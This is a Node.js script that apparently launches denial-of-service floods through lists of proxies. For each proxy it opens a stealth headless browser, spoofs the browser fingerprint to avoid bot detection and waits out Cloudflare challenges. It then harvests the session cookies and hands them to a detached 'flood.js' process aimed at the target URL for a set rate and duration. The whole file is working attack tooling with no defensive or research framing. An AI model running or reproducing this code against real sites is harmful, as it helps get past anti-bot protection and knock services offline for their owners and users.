const fs = require("fs");
const { spawn } = require("child_process");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin
puppeteer.use(StealthPlugin());

// Configuration
const MAX_RETRIES = 2;
const TIMEOUT = 45000; // 45 seconds

// Colors for logging
const colors = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  pink: "\x1b[35m",
};

function log(type, message) {
  const prefix = `${colors.cyan}[m85|Browser]${colors.reset}`;
  let color = colors.reset;
  let symbol = "ℒ";
  
  if (type === "error") { color = colors.red; symbol = "×"; }
  if (type === "success") { color = colors.green; symbol = "✓"; }
  if (type === "warn") { color = colors.yellow; symbol = "!"; }
  if (type === "info") { color = colors.cyan; symbol = "ℒ"; }
  if (type === "pink") { color = colors.pink; symbol = "★"; }
  
  console.log(`${prefix} ${color}${symbol} ${message}${colors.reset}`);
}

// Check command line arguments
if (process.argv.length < 7) {
  log("error", "Usage: node browser.js <url> <threads> <proxies.txt> <rate> <duration_seconds>");
  log("error", "Example: node browser.js https://example.com 5 proxies.txt 100 60");
  process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
let proxies = [];
try {
  const data = fs.readFileSync(proxyFile, 'utf8');
  proxies = data.trim().split(/\r?\n/).filter(p => p.trim());
  log("success", `Loaded ${proxies.length} proxies`);
} catch (error) {
  log("error", `Cannot read proxy file: ${error.message}`);
  process.exit(1);
}

if (proxies.length === 0) {
  log("error", "No proxies found in file");
  process.exit(1);
}

// Random user agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
];

function getRandomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Spoof fingerprint to avoid detection
async function spoofFingerprint(page) {
  await page.evaluateOnNewDocument(() => {
    // Override webdriver
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    
    // Override plugins
    Object.defineProperty(navigator, 'plugins', {
      get: () => [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Native Client', filename: 'internal-nacl-plugin' }
      ]
    });
    
    // Override languages
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    
    // Override hardware concurrency
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
    
    // Override device memory
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
    
    // Override permissions
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications' ?
        Promise.resolve({ state: Notification.permission }) :
        originalQuery(parameters)
    );
    
    // Add fake chrome.runtime
    window.chrome = {
      runtime: {}
    };
  });
}

// Main browser function - FIXED for ip:port format
async function openBrowser(proxy, id) {
  const userAgent = getRandomUA();
  const tempDir = `./temp_profile_${id}_${Date.now()}`;
  
  // Simple proxy formatting - NO AUTH REQUIRED
  let proxyUrl = proxy.trim();
  
  // Remove any protocol if present
  proxyUrl = proxyUrl.replace(/^https?:\/\//, '');
  
  // Just add http:// prefix for puppeteer
  proxyUrl = `http://${proxyUrl}`;
  
  log("info", `[${id}] Using proxy: ${proxyUrl}`);
  
  const options = {
    headless: "new",
    ignoreHTTPSErrors: true,
    userDataDir: tempDir,
    args: [
      `--proxy-server=${proxyUrl}`,
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--disable-blink-features=AutomationControlled',
      '--disable-features=IsolateOrigins,site-per-process',
      '--window-size=1920,1080',
      '--lang=en-US',
      `--user-agent=${userAgent}`,
      '--disable-web-security',
      '--allow-running-insecure-content',
      '--disable-background-networking',
      '--disable-default-apps',
      '--disable-extensions',
      '--disable-sync',
      '--disable-translate',
      '--hide-scrollbars',
      '--metrics-recording-only',
      '--mute-audio',
      '--no-first-run',
      '--safebrowsing-disable-auto-update'
    ]
  };
  
  let browser = null;
  
  try {
    log("info", `[${id}] Launching browser...`);
    
    // Launch browser with timeout
    const browserPromise = puppeteer.launch(options);
    const timeoutPromise = new Promise((_, reject) => 
      setTimeout(() => reject(new Error("Browser launch timeout")), TIMEOUT)
    );
    
    browser = await Promise.race([browserPromise, timeoutPromise]);
    const pages = await browser.pages();
    const page = pages[0];
    
    // Apply fingerprint spoofing
    await spoofFingerprint(page);
    
    // Set timeouts
    page.setDefaultTimeout(TIMEOUT);
    page.setDefaultNavigationTimeout(TIMEOUT);
    
    // Random delay
    await sleep(Math.random() * 2000 + 1000);
    
    log("info", `[${id}] Navigating to ${targetURL}`);
    
    // Navigation with retries for connection issues
    let navigationSuccess = false;
    let lastError = null;
    let pageContent = null;
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        await page.goto(targetURL, {
          waitUntil: 'domcontentloaded',
          timeout: TIMEOUT
        });
        
        navigationSuccess = true;
        pageContent = await page.content();
        log("success", `[${id}] Navigation succeeded on attempt ${attempt}`);
        break;
        
      } catch (navError) {
        lastError = navError;
        
        // Log specific errors without being too strict about auth
        if (navError.message.includes('ERR_INVALID_AUTH_CREDENTIALS')) {
          log("warn", `[${id}] Attempt ${attempt}/3: Proxy may require auth, continuing anyway...`);
        } else if (navError.message.includes('ERR_TUNNEL_CONNECTION_FAILED')) {
          log("warn", `[${id}] Attempt ${attempt}/3: Tunnel failed - proxy might be slow or dead`);
        } else if (navError.message.includes('ERR_CONNECTION_RESET')) {
          log("warn", `[${id}] Attempt ${attempt}/3: Connection reset - proxy unstable`);
        } else if (navError.message.includes('ERR_TIMED_OUT')) {
          log("warn", `[${id}] Attempt ${attempt}/3: Timeout - proxy slow`);
        } else {
          log("warn", `[${id}] Attempt ${attempt}/3: ${navError.message}`);
        }
        
        if (attempt < 3) {
          await sleep(4000);
          // Try to reload the page
          try {
            await page.reload({ timeout: 30000 });
          } catch(e) {
            // Ignore reload errors
          }
        }
      }
    }
    
    if (!navigationSuccess) {
      throw lastError || new Error("Navigation failed after 3 attempts");
    }
    
    // Check for Cloudflare challenge
    if (pageContent && (pageContent.includes("challenge-platform") || pageContent.includes("cf-browser-verification") || pageContent.includes("Just a moment"))) {
      log("pink", `[${id}] Cloudflare challenge detected - waiting for bypass`);
      await sleep(8000);
    }
    
    // Get page info
    const title = await page.title();
    const currentUrl = page.url();
    
    log("success", `[${id}] ✅ Loaded: ${title}`);
    
    // Get cookies
    const cookies = await page.cookies();
    let cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
    
    if (!cookieString) {
      cookieString = "no-cookies-found";
    }
    
    // Check if flood.js exists
    if (!fs.existsSync("flood.js")) {
      log("error", `[${id}] flood.js not found!`);
      await browser.close();
      try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch(e) {}
      return {
        success: false,
        proxy: proxy,
        error: "flood.js not found"
      };
    }
    
    // Spawn flood.js process
    log("success", `[${id}] 🚀 Spawning flood.js with proxy: ${proxy}`);
    
    const floodArgs = [
      "flood.js",
      targetURL,
      "100",
      "2",
      proxy,
      rates,
      cookieString,
      userAgent
    ];
    
    // Spawn flood.js process detached
    const floodProcess = spawn("node", floodArgs, {
      detached: true,
      stdio: 'ignore',
      windowsHide: true
    });
    
    floodProcess.unref();
    
    log("success", `[${id}] flood.js PID: ${floodProcess.pid}`);
    
    // Close browser
    await browser.close();
    
    // Cleanup temp directory
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch(e) {}
    
    return {
      success: true,
      proxy: proxy,
      title: title,
      pid: floodProcess.pid
    };
    
  } catch (error) {
    log("error", `[${id}] Failed: ${error.message}`);
    
    if (browser) {
      try { await browser.close(); } catch(e) {}
    }
    
    // Cleanup temp directory
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch(e) {}
    
    return {
      success: false,
      proxy: proxy,
      error: error.message
    };
  }
}

// Thread worker with retry
async function worker(proxy, id, retries = 0) {
  const result = await openBrowser(proxy, id);
  
  // Retry on certain errors
  const shouldRetry = !result.success && retries < MAX_RETRIES && 
                     (result.error.includes('ERR_TUNNEL_CONNECTION_FAILED') || 
                      result.error.includes('ERR_CONNECTION_RESET') ||
                      result.error.includes('ERR_TIMED_OUT'));
  
  if (shouldRetry) {
    log("warn", `[${id}] Retry ${retries + 1}/${MAX_RETRIES}`);
    await sleep(3000);
    return worker(proxy, id, retries + 1);
  }
  
  return result;
}

// Global stats
let successCount = 0;
let failCount = 0;
let totalCompleted = 0;

// Process function
async function processProxy(proxy, id) {
  const result = await worker(proxy, id);
  totalCompleted++;
  
  if (result.success) {
    successCount++;
    log("success", `[${id}] ✅ SUCCESS (${successCount}/${totalCompleted}) - Proxy: ${proxy}`);
  } else {
    failCount++;
    log("error", `[${id}] ❌ FAILED (${failCount}/${totalCompleted}) - Proxy: ${proxy} | ${result.error}`);
  }
  
  // Process next proxy if available
  if (proxyQueue.length > 0) {
    const nextProxy = proxyQueue.shift();
    if (nextProxy) {
      processProxy(nextProxy, id + threads);
    }
  }
}

// Proxy queue
let proxyQueue = [];

// Cleanup function
function cleanup() {
  log("warn", "Cleaning up...");
  
  if (process.platform === 'win32') {
    const { exec } = require('child_process');
    exec('taskkill /F /IM node.exe /FI "WINDOWTITLE eq flood.js"', () => {});
  } else {
    const { exec } = require('child_process');
    exec('pkill -f flood.js', () => {});
  }
}

// Main function
async function main() {
  log("info", `╔════════════════════════════════════════╗`);
  log("info", `║     m85 Browser with flood.js         ║`);
  log("info", `╚════════════════════════════════════════╝`);
  log("info", `Target: ${targetURL}`);
  log("info", `Threads: ${threads}`);
  log("info", `Duration: ${duration} seconds`);
  log("info", `Total proxies: ${proxies.length}`);
  
  // Check if flood.js exists
  if (!fs.existsSync("flood.js")) {
    log("error", "flood.js not found!");
    process.exit(1);
  }
  
  // Shuffle proxies
  for (let i = proxies.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
  }
  
  proxyQueue = [...proxies];
  
  // Set up cleanup
  process.on('SIGINT', () => {
    log("warn", "\nInterrupt received, cleaning up...");
    cleanup();
    setTimeout(() => process.exit(0), 2000);
  });
  
  // Start initial threads
  for (let i = 0; i < Math.min(threads, proxyQueue.length); i++) {
    const proxy = proxyQueue.shift();
    processProxy(proxy, i + 1);
  }
  
  // Wait for duration
  log("info", `Running for ${duration} seconds...`);
  await sleep(duration * 1000);
  
  // Cleanup
  log("warn", "Time limit reached, stopping...");
  cleanup();
  
  await sleep(2000);
  
  // Final stats
  log("info", "\n╔════════════════════════════════════════╗");
  log("info", "║           FINAL RESULTS                ║");
  log("info", "╚════════════════════════════════════════╝");
  log("success", `Total tested: ${totalCompleted}`);
  log("success", `✅ Successful: ${successCount}`);
  log("error", `❌ Failed: ${failCount}`);
  log("success", `📈 Success rate: ${((successCount / totalCompleted) * 100).toFixed(2)}%`);
  
  process.exit(0);
}

// Run
main().catch(error => {
  log("error", `Fatal: ${error.message}`);
  process.exit(1);
});
